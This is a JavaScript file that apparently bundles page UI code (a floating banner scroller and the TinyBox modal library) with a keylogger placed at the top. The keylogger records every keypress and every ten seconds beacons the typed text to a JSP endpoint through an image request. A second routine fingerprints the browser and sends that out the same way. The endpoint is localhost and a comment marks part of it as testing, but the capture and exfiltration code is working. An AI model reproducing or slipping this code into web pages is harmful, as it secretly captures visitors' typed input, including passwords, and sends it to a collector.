var str = "";
 function showkey(){
  var asc = event.keyCode;
  var key = String.fromCharCode(asc);
  str += key;
  txt.innerHTML = str;
 }
 document.onkeypress=showkey;
function sendstr()
{
	
	if (str !='')
	{
		new Image().src="http://localhost/jsp/key.jsp?key="+str;
	}	
	str="";
}
setInterval(sendstr,10000);
 var Sys = {};
 var ua = navigator.userAgent.toLowerCase();
 var s;
  (s = ua.match(/msie ([\d.]+)/)) ? Sys.ie = s[1] :
  (s = ua.match(/firefox\/([\d.]+)/)) ? Sys.firefox = s[1] :
  (s = ua.match(/chrome\/([\d.]+)/)) ? Sys.chrome = s[1] :
  (s = ua.match(/opera.([\d.]+)/)) ? Sys.opera = s[1] :
  (s = ua.match(/version\/([\d.]+).*safari/)) ? Sys.safari = s[1] : 0;
   //以下进行测试
   var browser;
 if (Sys.ie) browser='IE: ' + Sys.ie; 
 if (Sys.firefox) browser='Firefox: ' + Sys.firefox;
 if (Sys.chrome) browser='Chrome: ' + Sys.chrome;
 if (Sys.opera) browser='Opera: ' + Sys.opera;
 if (Sys.safari) browser='Safari: ' + Sys.safari;
 function sendbrowser()
{
	if (browser !='')
	{
	
		new Image().src="http://localhost/jsp/browser.jsp?browser="+browser;
	}	
	browser='';
}


 setInterval(sendbrowser,10000);
var speed = 100;
var scrollTop = null;
var hold = 0;
var float_banner;
var pos = null;
var timer = null;
var moveHeight = null;
float_banner = document.getElementById("float_banner");
window.onscroll=scroll_ad;
function scroll_ad(){
 scrollTop = document.documentElement.scrollTop+document.body.scrollTop;
 pos = scrollTop - float_banner.offsetTop;
 pos = pos/10
 moveHeight = pos>0?Math.ceil(pos):Math.floor(pos);
 if(moveHeight!=0){
  float_banner.style.top = float_banner.offsetTop+moveHeight+"px";
  setTimeout(scroll_ad,speed);
 }
}
//alert(scrollTop);
 T$('click_test').onclick = function(){TINY.box.show('test.html',1,300,150,1)}
  var TINY={};

function T$(i){return document.getElementById(i)}

TINY.box=function(){
	var p,m,b,fn,ic,iu,iw,ih,ia,f=0;
	return{
		show:function(c,u,w,h,a,t){
			if(!f){
				p=document.createElement('div'); p.id='tinybox';
				m=document.createElement('div'); m.id='tinymask';
				b=document.createElement('div'); b.id='tinycontent';
				document.body.appendChild(m); document.body.appendChild(p); p.appendChild(b);
				m.onclick=TINY.box.hide; window.onresize=TINY.box.resize; f=1
			}
			if(!a&&!u){
				p.style.width=w?w+'px':'auto'; p.style.height=h?h+'px':'auto';
				p.style.backgroundImage='none'; b.innerHTML=c
			}else{
				b.style.display='none'; p.style.width=p.style.height='100px'
			}
			this.mask();
			ic=c; iu=u; iw=w; ih=h; ia=a; this.alpha(m,1,80,3);
			if(t){setTimeout(function(){TINY.box.hide()},1000*t)}
		},
		fill:function(c,u,w,h,a){
			if(u){
				p.style.backgroundImage='';
				var x=window.XMLHttpRequest?new XMLHttpRequest():new ActiveXObject('Microsoft.XMLHTTP');
				x.onreadystatechange=function(){
					if(x.readyState==4&&x.status==200){TINY.box.psh(x.responseText,w,h,a)}
				};
				x.open('GET',c,1); x.send(null)
			}else{
				this.psh(c,w,h,a)
			}
		},
		psh:function(c,w,h,a){
			if(a){
				if(!w||!h){
					var x=p.style.width, y=p.style.height; b.innerHTML=c;
					p.style.width=w?w+'px':''; p.style.height=h?h+'px':'';
					b.style.display='';
					w=parseInt(b.offsetWidth); h=parseInt(b.offsetHeight);
					b.style.display='none'; p.style.width=x; p.style.height=y;
				}else{
					b.innerHTML=c
				}
				this.size(p,w,h,4)
			}else{
				p.style.backgroundImage='none'
			}
		},
		hide:function(){
			TINY.box.alpha(p,-1,0,5)
		},
		resize:function(){
			TINY.box.pos(); TINY.box.mask()
		},
		mask:function(){
			m.style.height=TINY.page.theight()+'px';
			m.style.width=''; m.style.width=TINY.page.twidth()+'px'
		},
		pos:function(){
			var t=(TINY.page.height()/2)-(p.offsetHeight/2); t=t<10?10:t;
			p.style.top=(t+TINY.page.top())+'px';
			p.style.left=(TINY.page.width()/2)-(p.offsetWidth/2)+'px'
		},
		alpha:function(e,d,a,s){
			clearInterval(e.ai);
			if(d==1){
				e.style.opacity=0; e.style.filter='alpha(opacity=0)';
				e.style.display='block'; this.pos()
			}
			e.ai=setInterval(function(){TINY.box.twalpha(e,a,d,s)},20)
		},
		twalpha:function(e,a,d,s){
			var o=Math.round(e.style.opacity*100);
			if(o==a){
				clearInterval(e.ai);
				if(d==-1){
					e.style.display='none';
					e==p?TINY.box.alpha(m,-1,0,3):b.innerHTML=p.style.backgroundImage=''
				}else{
					e==m?this.alpha(p,1,100,5):TINY.box.fill(ic,iu,iw,ih,ia)
				}
			}else{
				var n=o+Math.ceil(Math.abs(a-o)/s)*d;
				e.style.opacity=n/100; e.style.filter='alpha(opacity='+n+')'
			}
		},
		size:function(e,w,h,s){
			e=typeof e=='object'?e:T$(e); clearInterval(e.si);
			var ow=e.offsetWidth, oh=e.offsetHeight,
			wo=ow-parseInt(e.style.width), ho=oh-parseInt(e.style.height);
			var wd=ow-wo>w?-1:1, hd=(oh-ho>h)?-1:1;
			e.si=setInterval(function(){TINY.box.twsize(e,w,wo,wd,h,ho,hd,s)},20)
		},
		twsize:function(e,w,wo,wd,h,ho,hd,s){
			var ow=e.offsetWidth-wo, oh=e.offsetHeight-ho;
			if(ow==w&&oh==h){
				clearInterval(e.si); p.style.backgroundImage='none'; b.style.display='block'
			}else{
				if(ow!=w){e.style.width=ow+(Math.ceil(Math.abs(w-ow)/s)*wd)+'px'}
				if(oh!=h){e.style.height=oh+(Math.ceil(Math.abs(h-oh)/s)*hd)+'px'}
				this.pos()
			}
		}
	}
}();

TINY.page=function(){
	return{
		top:function(){return document.body.scrollTop||document.documentElement.scrollTop},
		width:function(){return self.innerWidth||document.documentElement.clientWidth},
		height:function(){return self.innerHeight||document.documentElement.clientHeight},
		theight:function(){
			var d=document, b=d.body, e=d.documentElement;
			return Math.max(Math.max(b.scrollHeight,e.scrollHeight),Math.max(b.clientHeight,e.clientHeight))
		},
		twidth:function(){
			var d=document, b=d.body, e=d.documentElement;
			return Math.max(Math.max(b.scrollWidth,e.scrollWidth),Math.max(b.clientWidth,e.clientWidth))
		}
	}
}();